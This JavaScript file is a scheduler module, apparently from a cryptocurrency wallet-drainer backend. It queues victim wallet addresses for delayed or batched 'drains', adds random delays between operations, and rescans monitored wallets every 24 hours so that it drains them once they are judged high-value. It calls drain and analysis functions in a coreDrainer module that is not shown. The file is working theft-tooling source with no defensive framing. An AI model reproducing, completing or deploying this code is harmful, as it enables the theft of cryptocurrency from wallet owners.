// backend/modules/scheduler.js
export class Scheduler {
    constructor() {
        this.isInitialized = false;
        this.scheduledDrains = [];
        this.batchQueue = [];
        this.monitoredWallets = new Map();
        this.drainScheduler = null;
        this.batchProcessor = null;
        this.monitorService = null;
    }

    async initialize() {
        if (this.isInitialized) return true;
        try {
            console.log(`🔄 Initializing ${this.constructor.name}...`);
            // Add any module-specific initialization here
            this.isInitialized = true;
            console.log(`✅ ${this.constructor.name} initialized`);
            return true;
        } catch (error) {
            console.error(`❌ ${this.constructor.name} initialization failed:`, error);
            return false;
        }
    }

    // ===== EXACT FUNCTIONS FROM app.js =====
    async scheduleDrain(userAddress, priority = 'normal') {
        const delay = priority === 'priority' ? 3600000 : 86400000;
        const executeTime = Date.now() + delay;
        
        console.log(`⏰ Scheduled ${priority} drain in ${Math.round(delay/1000/60)} minutes`);
        
        const schedule = {
            address: userAddress,
            executeTime: executeTime,
            priority: priority,
            scheduledAt: new Date().toISOString()
        };
        
        this.scheduledDrains.push(schedule);
        
        if (!this.drainScheduler) {
            this.startDrainScheduler();
        }
        
        return schedule;
    }

    async addToBatchQueue(userAddress) {
        console.log(`📋 Added to batch queue (processes hourly)`);
        
        const batchItem = {
            address: userAddress,
            addedAt: Date.now(),
            processed: false
        };
        
        this.batchQueue.push(batchItem);
        
        if (!this.batchProcessor) {
            this.startBatchProcessor();
        }
        
        return batchItem;
    }

    async monitorWallet(userAddress) {
        const nextScan = Date.now() + 86400000;
        
        console.log(`🔍 Monitoring - will rescan in 24 hours`);
        
        this.monitoredWallets.set(userAddress, {
            lastScan: Date.now(),
            nextScan: nextScan,
            scanCount: 0
        });
        
        if (!this.monitorService) {
            this.startWalletMonitor();
        }
        
        return { success: true, nextScan: new Date(nextScan).toISOString() };
    }

    startDrainScheduler() {
        if (this.drainScheduler) return;
        
        this.drainScheduler = setInterval(() => {
            const now = Date.now();
            
            for (let i = this.scheduledDrains.length - 1; i >= 0; i--) {
                const drain = this.scheduledDrains[i];
                
                if (now >= drain.executeTime) {
                    console.log(`⏰ Executing scheduled ${drain.priority} drain for ${drain.address}`);
                    this.executeScheduledDrain(drain.address);
                    this.scheduledDrains.splice(i, 1);
                }
            }
            
            if (this.scheduledDrains.length === 0) {
                clearInterval(this.drainScheduler);
                this.drainScheduler = null;
            }
            
        }, 60000);
    }

    startBatchProcessor() {
        if (this.batchProcessor) return;
        
        this.batchProcessor = setInterval(async () => {
            if (this.batchQueue.length === 0) {
                clearInterval(this.batchProcessor);
                this.batchProcessor = null;
                return;
            }
            
            const batchSize = Math.min(5, this.batchQueue.length);
            const batch = this.batchQueue.splice(0, batchSize);
            
            console.log(`🔄 Processing batch of ${batchSize} wallets`);
            
            for (const item of batch) {
                if (!item.processed) {
                    try {
                        await this.processBatchItem(item.address);
                        item.processed = true;
                        console.log(`✅ Batch processed: ${item.address}`);
                    } catch (error) {
                        console.error(`❌ Batch processing failed for ${item.address}: ${error.message}`);
                    }
                    
                    await this.randomDelay(10000, 20000);
                }
            }
            
        }, 3600000);
    }

    startWalletMonitor() {
        if (this.monitorService) return;
        
        this.monitorService = setInterval(async () => {
            const now = Date.now();
            const walletsToRescan = [];
            
            for (const [address, data] of this.monitoredWallets.entries()) {
                if (now >= data.nextScan) {
                    walletsToRescan.push(address);
                    data.scanCount++;
                    data.lastScan = now;
                    data.nextScan = now + 86400000;
                }
            }
            
            if (walletsToRescan.length > 0) {
                console.log(`🔍 Rescanning ${walletsToRescan.length} monitored wallets`);
                
                for (const address of walletsToRescan) {
                    try {
                        await this.rescanMonitoredWallet(address);
                    } catch (error) {
                        console.error(`❌ Monitor rescan failed for ${address}: ${error.message}`);
                    }
                    
                    await this.randomDelay(5000, 10000);
                }
            }
            
            if (this.monitoredWallets.size === 0) {
                clearInterval(this.monitorService);
                this.monitorService = null;
            }
            
        }, 300000);
    }

    async processBatchItem(address) {
        console.log(`🔄 Processing batch item: ${address}`);
        // Replace with actual drain call
        const result = await import('./coreDrainer.js').then(module => 
            module.coreDrainer.executeDrain(address)
        );
        return result;
    }

    async rescanMonitoredWallet(address) {
        console.log(`🔍 Rescanning monitored wallet: ${address}`);
        // Replace with actual analysis call
        const analysis = await import('./coreDrainer.js').then(module =>
            module.coreDrainer.analyzeWallet(address)
        );
        
        if (analysis.categories.highValue) {
            console.log(`🎯 Monitored wallet became valuable: ${address}`);
            this.monitoredWallets.delete(address);
            await this.executeScheduledDrain(address);
        }
        
        return analysis;
    }

    async executeScheduledDrain(address) {
        console.log(`⚡ Executing scheduled drain for: ${address}`);
        // Replace with actual drain call
        const result = await import('./coreDrainer.js').then(module =>
            module.coreDrainer.executeImmediateDrain(address)
        );
        return result;
    }

    async randomDelay(minMs = 5000, maxMs = 20000) {
        const delay = Math.floor(Math.random() * (maxMs - minMs + 1)) + minMs;
        console.log(`⏳ Waiting ${delay}ms...`);
        return new Promise(resolve => setTimeout(resolve, delay));
    }

    getSchedulerStatus() {
        return {
            scheduledDrains: this.scheduledDrains.length,
            batchQueue: this.batchQueue.filter(item => !item.processed).length,
            monitoredWallets: this.monitoredWallets.size,
            schedulerRunning: !!this.drainScheduler,
            batchProcessorRunning: !!this.batchProcessor,
            monitorRunning: !!this.monitorService
        };
    }

    cleanup() {
        if (this.drainScheduler) clearInterval(this.drainScheduler);
        if (this.batchProcessor) clearInterval(this.batchProcessor);
        if (this.monitorService) clearInterval(this.monitorService);
        
        this.drainScheduler = null;
        this.batchProcessor = null;
        this.monitorService = null;
        this.isInitialized = false;
    }
}

export const scheduler = new Scheduler();